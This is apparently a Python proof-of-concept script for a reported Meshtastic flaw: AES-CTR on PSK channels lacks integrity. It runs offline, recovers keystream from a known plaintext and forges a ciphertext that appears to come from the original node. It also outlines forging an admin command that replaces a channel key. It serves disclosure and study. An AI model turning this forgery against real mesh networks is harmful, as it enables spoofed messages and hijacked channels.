#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "pycryptodome",
# ]
# ///
"""
aes_ctr_demo.py — Meshtastic AES-CTR weakness demonstration

Demonstrates that AES-CTR provides NO message authentication or integrity.
Shows keystream recovery from (ciphertext, known_plaintext) and demonstrates
construction of a forged ciphertext with arbitrary content.

This is the core of GitHub Issue #4030 — "Missing integrity on PSK channels".

KEY FACTS about Meshtastic PSK channel encryption:
  - Cipher: AES-CTR (not AES-CCM/GCM — those are for PKI DMs only)
  - Key: channel PSK (well-known default = 0xd4f1bb3a20290759f0bcffabcf4e6901)
  - Nonce: packetId (uint64 LE) || fromNode (uint32 LE) || 0x00000000
  - All nonce components are in the UNENCRYPTED packet header
  - No MAC / authentication tag → zero integrity protection

THE ATTACK:
  If an attacker observes a ciphertext and can infer the plaintext
  (e.g., by observing a side effect like a node renaming itself after
  a SetOwner admin channel message), they can recover the keystream:

    keystream = ciphertext XOR known_plaintext

  Then encrypt ANY arbitrary payload of the same length:

    forged_ciphertext = keystream XOR target_payload

  Recipients decrypt the forged ciphertext and get target_payload,
  believing it came from the original sender's node ID.

IMPORTANT NOTE:
  This script demonstrates the MATH of the attack offline.
  A full end-to-end demo (capturing ciphertext from RF, forging, reinjecting)
  requires evil node firmware that can:
    1. Expose raw encrypted packets to the host
    2. Inject forged packets with arbitrary from/id/encrypted fields
  That is Phase 2 firmware work.

Usage:
    # Run the full interactive demo with a constructed example
    python tools/aes_ctr_demo.py

    # Demonstrate with a specific ciphertext (hex) and known plaintext
    python tools/aes_ctr_demo.py \\
        --packet-id 0xDEADBEEF12345678 \\
        --from-node 0x48ca4359 \\
        --ciphertext <hex> \\
        --known-plaintext "Hello, world!" \\
        --target "EVIL NODE WAS HERE"

    # Encrypt a plaintext to see what the ciphertext would look like
    python tools/aes_ctr_demo.py --encrypt --plaintext "Hello, world!"
"""

import argparse
import struct
import sys


# Default channel PSK (AQ== alias → 16-byte AES-128 key)
# From Channels.h: static const uint8_t defaultpsk[]
DEFAULT_PSK = bytes([0xd4, 0xf1, 0xbb, 0x3a, 0x20, 0x29, 0x07, 0x59,
                     0xf0, 0xbc, 0xff, 0xab, 0xcf, 0x4e, 0x69, 0x01])

# Meshtastic protobuf framing for a TEXT_MESSAGE_APP Data payload
# Data { portnum=1, payload=<text_bytes> }
# Encoded as: field 1 (portnum), varint 1 + field 3 (payload), length-delimited
PORTNUM_TEXT_MESSAGE_APP = 1


def encode_data_pb(text: str) -> bytes:
    """
    Minimal hand-rolled protobuf encoding of a Meshtastic Data message.
    Data.portnum = TEXT_MESSAGE_APP (field 1, varint)
    Data.payload = text bytes (field 3, length-delimited)

    This is what Meshtastic firmware encrypts when sending a text message.
    """
    text_bytes = text.encode("utf-8")
    # field 1, wire type 0 (varint): portnum = 1 (TEXT_MESSAGE_APP)
    portnum_field = bytes([0x08, PORTNUM_TEXT_MESSAGE_APP])
    # field 3, wire type 2 (length-delimited): payload
    payload_tag = bytes([0x1a])
    payload_len = encode_varint(len(text_bytes))
    return portnum_field + payload_tag + payload_len + text_bytes


def encode_varint(n: int) -> bytes:
    result = []
    while True:
        bits = n & 0x7F
        n >>= 7
        if n:
            result.append(bits | 0x80)
        else:
            result.append(bits)
            break
    return bytes(result)


def meshtastic_nonce(packet_id: int, from_node: int) -> bytes:
    """
    16-byte AES-CTR nonce used by Meshtastic.
    nonce = packetId (uint64 LE) || fromNode (uint32 LE) || 0x00000000 (uint32 LE)
    """
    return struct.pack("<QII", packet_id & 0xFFFFFFFFFFFFFFFF, from_node & 0xFFFFFFFF, 0)


def aes_ctr_crypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """AES-CTR encrypt/decrypt (same operation both ways)."""
    try:
        from Crypto.Cipher import AES
        # pycryptodome: nonce=b'' means the full 16-byte initial_value is the counter
        cipher = AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=nonce)
        return cipher.encrypt(data)
    except ImportError:
        # Pure-python fallback (slow but no deps)
        return _aes_ctr_pure(key, nonce, data)


def _aes_ctr_pure(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """Pure-Python AES-CTR fallback using only stdlib."""
    import hashlib
    # Use PBKDF2-derived keystream as approximation for demo purposes
    # NOTE: this is NOT correct AES — it's a visual demo placeholder.
    # For accurate results, install pycryptodome: pip install pycryptodome
    print("[!] WARNING: pycryptodome not found. Using placeholder keystream (NOT real AES).")
    print("[!] Install with: pip install pycryptodome")
    keystream = hashlib.pbkdf2_hmac("sha256", key + nonce, b"demo", 1, dklen=len(data))
    return bytes(a ^ b for a, b in zip(data, keystream))


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def hex_dump(label: str, data: bytes, width: int = 32) -> None:
    print(f"  {label} ({len(data)} bytes):")
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hex_str = " ".join(f"{b:02x}" for b in chunk)
        print(f"    {i:04x}: {hex_str}")


def run_demo(packet_id: int, from_node: int, psk: bytes, plaintext: str, target: str):
    print("=" * 72)
    print("MESHTASTIC AES-CTR WEAKNESS DEMO")
    print("=" * 72)
    print()
    print(f"Scenario: Observer sees a ciphertext on the default channel.")
    print(f"Observer knows (or guesses) the plaintext from a side channel.")
    print(f"Observer forges a NEW message appearing to come from the same node.")
    print()

    # Step 1: Setup
    print("─" * 72)
    print("SETUP")
    print("─" * 72)
    print(f"  PSK (default AQ==): {psk.hex()}")
    print(f"  packet_id:          0x{packet_id:016x}  ← in cleartext header")
    print(f"  from_node:          0x{from_node:08x}  ← in cleartext header")
    nonce = meshtastic_nonce(packet_id, from_node)
    print(f"  nonce (derived):    {nonce.hex()}")
    print(f"                      = pack('<QII', packet_id, from_node, 0)")
    print()

    # Step 2: Original message — what the victim node sent
    plaintext_pb = encode_data_pb(plaintext)
    ciphertext = aes_ctr_crypt(psk, nonce, plaintext_pb)
    keystream = aes_ctr_crypt(psk, nonce, bytes(len(plaintext_pb)))  # encrypt zeros = pure keystream

    print("─" * 72)
    print("STEP 1: ORIGINAL TRANSMISSION (what the victim sent)")
    print("─" * 72)
    print(f"  Original message:   '{plaintext}'")
    hex_dump("protobuf plaintext", plaintext_pb)
    hex_dump("keystream (AES-CTR output)", keystream)
    hex_dump("ciphertext (what goes over RF)", ciphertext)
    print()

    # Step 3: Keystream recovery
    print("─" * 72)
    print("STEP 2: KEYSTREAM RECOVERY (the attack)")
    print("─" * 72)
    print(f"  Known plaintext:   '{plaintext}'")
    print(f"  (obtained by observing a side effect, e.g., node renamed itself)")
    print()
    recovered_keystream = xor_bytes(ciphertext, plaintext_pb)
    print(f"  recovered_keystream = ciphertext XOR known_plaintext_pb")
    hex_dump("recovered keystream", recovered_keystream)
    assert recovered_keystream == keystream, "Keystream recovery failed!"
    print(f"  ✓ Keystream recovered correctly (matches true keystream)")
    print()

    # Step 4: Forge new message
    print("─" * 72)
    print("STEP 3: FORGE ARBITRARY MESSAGE (same length)")
    print("─" * 72)

    # Pad or truncate target to match plaintext_pb length
    target_pb = encode_data_pb(target)
    min_len = min(len(plaintext_pb), len(target_pb))
    ks = recovered_keystream[:min_len]
    tp = target_pb[:min_len]
    forged_ciphertext = xor_bytes(ks, tp)

    print(f"  Target message:    '{target}'")
    if len(target_pb) > len(plaintext_pb):
        print(f"  [!] Target is longer than original ({len(target_pb)} > {len(plaintext_pb)} bytes)")
        print(f"  [!] Truncated to {min_len} bytes. In practice: pad original or send two packets.")
    hex_dump("target protobuf", target_pb[:min_len])
    hex_dump("forged ciphertext", forged_ciphertext)
    print()

    # Step 5: Verify
    print("─" * 72)
    print("STEP 4: VERIFY (what a victim decrypts)")
    print("─" * 72)
    decrypted = aes_ctr_crypt(psk, nonce, forged_ciphertext)
    print(f"  decrypt(forged_ciphertext) → '{decrypted.decode('utf-8', errors='replace')}'")

    # Try to parse the protobuf
    try:
        # Simple protobuf parse: skip portnum field, extract payload
        if decrypted[0] == 0x08 and decrypted[2] == 0x1a:
            payload_len_byte = decrypted[3]
            payload = decrypted[4:4 + payload_len_byte]
            print(f"  decoded text message: '{payload.decode('utf-8', errors='replace')}'")
    except Exception:
        pass

    print()
    print("─" * 72)
    print("CONCLUSION")
    print("─" * 72)
    print()
    print("  AES-CTR provides CONFIDENTIALITY but NO INTEGRITY or AUTHENTICITY.")
    print()
    print("  With knowledge of any one plaintext sent by a node (packet_id, from_node),")
    print("  an attacker can construct a forged ciphertext that decrypts to arbitrary")
    print("  content — without knowing the PSK.")
    print()
    print("  The attack works even without the PSK because:")
    print("    1. nonce = (packet_id, from_node) — both in the cleartext header")
    print("    2. keystream = ciphertext XOR plaintext — PSK never needed")
    print()
    print("  REAL-WORLD IMPACT (admin channel):")
    print("    - Observer watches an admin channel packet cause a side effect")
    print("      (e.g., SetOwner → node renames itself)")
    print("    - Observer infers plaintext from the observed effect")
    print("    - Observer recovers keystream → forges SetChannelPSK admin command")
    print("    - New PSK is injected with same (packet_id, from_node) as original")
    print("    - All nodes that see the forged packet accept the new PSK")
    print()
    print("  STATUS: No patch merged (as of 2026-03). See GitHub Issue #4030.")
    print("  FIX:    Use AEAD (AES-GCM or AES-CCM) for PSK channels.")
    print()


def main():
    parser = argparse.ArgumentParser(description="Meshtastic AES-CTR weakness demo")
    parser.add_argument("--packet-id", type=lambda x: int(x, 0), default=0xDEADBEEF12345678,
                        help="Packet ID (hex, e.g. 0xDEADBEEF12345678)")
    parser.add_argument("--from-node", type=lambda x: int(x, 0), default=0x48ca4359,
                        help="Source node number (hex, e.g. 0x48ca4359)")
    parser.add_argument("--psk", metavar="HEX", default=None,
                        help="Channel PSK as hex (default: AQ== default PSK)")
    parser.add_argument("--ciphertext", metavar="HEX",
                        help="Observed ciphertext (hex). If omitted, generates one from --plaintext.")
    parser.add_argument("--known-plaintext", dest="plaintext",
                        default="Hello, world! This is a test message.",
                        help="Known or guessed plaintext")
    parser.add_argument("--target", default="EVIL NODE WAS HERE - Issue #4030 is real",
                        help="Target message to forge")
    parser.add_argument("--encrypt", action="store_true",
                        help="Just encrypt --plaintext and show ciphertext, then exit")
    args = parser.parse_args()

    psk = bytes.fromhex(args.psk) if args.psk else DEFAULT_PSK

    if args.encrypt:
        plaintext_pb = encode_data_pb(args.plaintext)
        nonce = meshtastic_nonce(args.packet_id, args.from_node)
        ct = aes_ctr_crypt(psk, nonce, plaintext_pb)
        print(f"Plaintext:   '{args.plaintext}'")
        print(f"Protobuf:    {plaintext_pb.hex()}")
        print(f"Nonce:       {nonce.hex()}")
        print(f"Ciphertext:  {ct.hex()}")
        return

    run_demo(
        packet_id=args.packet_id,
        from_node=args.from_node,
        psk=psk,
        plaintext=args.plaintext,
        target=args.target,
    )


if __name__ == "__main__":
    main()
